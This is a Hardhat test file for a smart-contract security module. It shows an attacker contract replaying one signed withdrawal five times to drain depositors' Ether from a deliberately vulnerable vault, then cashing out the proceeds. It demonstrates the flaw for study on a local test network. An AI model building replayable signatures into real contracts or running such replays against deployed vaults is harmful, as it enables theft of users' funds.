import { anyValue } from "@nomicfoundation/hardhat-ethers-chai-matchers/withArgs";
import { expect } from "chai";
import { getBytes, solidityPackedKeccak256 } from "ethers";
import hre from "hardhat";

describe("Signature replay module: replayable signature vault", function () {
  let connection;

  before(async function () {
    // In Hardhat 3, network helpers are available through a network connection.
    connection = await hre.network.connect();
  });

  async function deploySignatureReplayVulnerableFixture() {
    // Create a realistic actor set:
    // authorized signer, two honest depositors, and the attacker operator.
    const { ethers } = connection;
    const [authorizedSigner, alice, bob, attackerOperator] =
      await ethers.getSigners();

    const vulnerableFactory = await ethers.getContractFactory("ReplayableSignatureVault");
    const vulnerableVault = await vulnerableFactory.deploy(authorizedSigner.address);
    await vulnerableVault.waitForDeployment();

    const attackerFactory = await ethers.getContractFactory("SignatureReplayAttacker");
    const attackerContract = await attackerFactory
      .connect(attackerOperator)
      .deploy(await vulnerableVault.getAddress());
    await attackerContract.waitForDeployment();

    // Honest users fund the vault.
    await vulnerableVault.connect(alice).deposit({ value: ethers.parseEther("3") });
    await vulnerableVault.connect(bob).deposit({ value: ethers.parseEther("4") });

    const claimAmount = ethers.parseEther("1");
    const messageHash = solidityPackedKeccak256(
      ["address", "uint256", "address"],
      [await attackerContract.getAddress(), claimAmount, await vulnerableVault.getAddress()]
    );
    const signature = await authorizedSigner.signMessage(getBytes(messageHash));

    return {
      ethers,
      authorizedSigner,
      alice,
      bob,
      attackerOperator,
      vulnerableVault,
      attackerContract,
      claimAmount,
      signature,
    };
  }

  it("lets an attacker replay the same signed withdrawal multiple times", async function () {
    const { networkHelpers } = connection;
    const {
      ethers,
      vulnerableVault,
      attackerContract,
      attackerOperator,
      claimAmount,
      signature,
    } = await networkHelpers.loadFixture(deploySignatureReplayVulnerableFixture);

    expect(await vulnerableVault.vaultBalance()).to.equal(
      ethers.parseEther("7")
    );

    await expect(
      attackerContract
        .connect(attackerOperator)
        .attack(claimAmount, signature, 5)
    )
      .to.emit(attackerContract, "ReplayExecuted")
      .withArgs(claimAmount, 5n, anyValue);

    expect(await vulnerableVault.vaultBalance()).to.equal(
      ethers.parseEther("2")
    );
    expect(
      await ethers.provider.getBalance(await attackerContract.getAddress())
    ).to.equal(ethers.parseEther("5"));
  });

  it("lets the attacker operator cash out the Ether stolen through repeated signature reuse", async function () {
    const { networkHelpers } = connection;
    const {
      ethers,
      vulnerableVault,
      attackerContract,
      attackerOperator,
      claimAmount,
      signature,
    } = await networkHelpers.loadFixture(deploySignatureReplayVulnerableFixture);

    await attackerContract
      .connect(attackerOperator)
      .attack(claimAmount, signature, 5);

    const operatorBalanceBefore = await ethers.provider.getBalance(attackerOperator.address);

    const cashoutTx = await attackerContract
      .connect(attackerOperator)
      .withdrawLoot();
    const receipt = await cashoutTx.wait();
    const gasUsed = receipt.gasUsed * receipt.gasPrice;

    const operatorBalanceAfter = await ethers.provider.getBalance(attackerOperator.address);

    expect(await vulnerableVault.vaultBalance()).to.equal(
      ethers.parseEther("2")
    );
    expect(
      await ethers.provider.getBalance(await attackerContract.getAddress())
    ).to.equal(0n);
    expect(operatorBalanceAfter).to.equal(
      operatorBalanceBefore + ethers.parseEther("5") - gasUsed
    );
  });
});
